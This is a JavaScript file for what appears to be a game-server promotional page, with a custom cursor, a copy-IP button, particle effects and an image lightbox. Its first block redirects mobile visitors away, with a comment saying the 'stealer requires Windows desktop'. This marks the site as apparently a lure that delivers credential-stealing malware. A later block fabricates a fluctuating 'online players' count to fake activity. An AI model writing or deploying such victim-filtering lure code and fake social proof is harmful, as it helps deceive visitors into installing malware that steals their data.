// Block mobile / tablet users (stealer requires Windows desktop)
(function(){
    var ua = navigator.userAgent || navigator.vendor || window.opera;
    if (/android|iphone|ipad|ipod|blackberry|windows phone|opera mini|iemobile|mobile/i.test(ua)) {
        window.location.replace("https://www.google.com");
    }
})();

// Custom Cursor
const cursorDot = document.querySelector('.cursor-dot');
const cursorOutline = document.querySelector('.cursor-outline');

window.addEventListener('mousemove', (e) => {
    const posX = e.clientX;
    const posY = e.clientY;

    cursorDot.style.left = `${posX}px`;
    cursorDot.style.top = `${posY}px`;

    cursorOutline.animate({
        left: `${posX}px`,
        top: `${posY}px`
    }, { duration: 500, fill: "forwards" });
});

// Interactive elements hover effect for cursor
const iterables = document.querySelectorAll('button, a, .ip-box');

iterables.forEach(link => {
    link.addEventListener('mouseover', () => {
        cursorOutline.style.width = '50px';
        cursorOutline.style.height = '50px';
        cursorOutline.style.backgroundColor = 'rgba(255, 117, 151, 0.1)';
    });
    
    link.addEventListener('mouseleave', () => {
        cursorOutline.style.width = '30px';
        cursorOutline.style.height = '30px';
        cursorOutline.style.backgroundColor = 'transparent';
    });
});

// Copy IP Function
function copyIP() {
    const ip = document.getElementById('server-ip').innerText;
    navigator.clipboard.writeText(ip).then(() => {
        const btn = document.querySelector('.copy-btn');
        const originalText = btn.innerHTML;
        btn.innerHTML = '<i class="fa-solid fa-check"></i> Copied!';
        btn.style.background = '#4ade80';
        
        setTimeout(() => {
            btn.innerHTML = originalText;
            btn.style.background = 'rgba(255, 255, 255, 0.1)';
        }, 2000);
    });
}

// Sparkle Particle Effect on Hero
function createParticles() {
    const container = document.getElementById('particles');
    if(!container) return;
    
    for (let i = 0; i < 30; i++) {
        const particle = document.createElement('div');
        particle.style.position = 'absolute';
        particle.style.width = Math.random() * 4 + 2 + 'px';
        particle.style.height = particle.style.width;
        particle.style.background = Math.random() > 0.5 ? '#FF7597' : '#ffffff';
        particle.style.borderRadius = '50%';
        particle.style.top = Math.random() * 100 + '%';
        particle.style.left = Math.random() * 100 + '%';
        particle.style.opacity = Math.random() * 0.5 + 0.2;
        particle.style.boxShadow = `0 0 10px ${particle.style.background}`;
        
        // Animation
        particle.animate([
            { transform: 'translateY(0) scale(1)', opacity: 0 },
            { opacity: particle.style.opacity, offset: 0.2 },
            { transform: `translateY(-${Math.random() * 100 + 50}px) scale(${Math.random() + 0.5})`, opacity: 0 }
        ], {
            duration: Math.random() * 3000 + 2000,
            iterations: Infinity,
            delay: Math.random() * 2000
        });
        
        container.appendChild(particle);
    }
}

document.addEventListener('DOMContentLoaded', createParticles);

// Persistent realistic online counter
(function() {
    const KEY = 'ksmp_online';
    const BASE_MIN = 120, BASE_MAX = 180;

    // Get or initialize stored value
    let stored = parseInt(localStorage.getItem(KEY));
    if (!stored || stored < BASE_MIN || stored > BASE_MAX) {
        stored = 135 + Math.floor(Math.random() * 30); // 135-165 on first visit
    }

    // Fluctuate slightly from last visit (±5 max)
    const delta = Math.floor(Math.random() * 11) - 5;
    let current = Math.min(BASE_MAX, Math.max(BASE_MIN, stored + delta));
    localStorage.setItem(KEY, current);

    function updateCounters(val) {
        document.querySelectorAll('.online-status').forEach(el => {
            el.innerHTML = `<span class="pulse"></span> Online: ${val}`;
        });
    }

    updateCounters(current);

    // Live tick: ±1-2 every 20 seconds (simulates players joining/leaving)
    setInterval(() => {
        const tick = Math.floor(Math.random() * 5) - 2; // -2 to +2
        current = Math.min(BASE_MAX, Math.max(BASE_MIN, current + tick));
        localStorage.setItem(KEY, current);
        updateCounters(current);
    }, 20000);
})();


// Lightbox Functionality
const lightbox = document.getElementById('lightbox');
if (lightbox) {
    const lightboxImg = document.getElementById('lightbox-img');
    const lightboxClose = document.querySelector('.lightbox-close');
    const galleryItems = document.querySelectorAll('.gallery-item img');

    galleryItems.forEach(img => {
        // Enlarge custom cursor on hover
        img.addEventListener('mouseover', () => {
            cursorOutline.style.width = '60px';
            cursorOutline.style.height = '60px';
            cursorOutline.style.backgroundColor = 'rgba(255, 117, 151, 0.15)';
        });
        img.addEventListener('mouseleave', () => {
            cursorOutline.style.width = '30px';
            cursorOutline.style.height = '30px';
            cursorOutline.style.backgroundColor = 'transparent';
        });

        img.addEventListener('click', () => {
            lightbox.classList.add('active');
            lightboxImg.src = img.src;
        });
    });

    // Close when clicking X
    lightboxClose.addEventListener('click', () => {
        lightbox.classList.remove('active');
    });

    // Close when clicking outside image (the background)
    lightbox.addEventListener('click', (e) => {
        if (e.target !== lightboxImg) {
            lightbox.classList.remove('active');
        }
    });
}
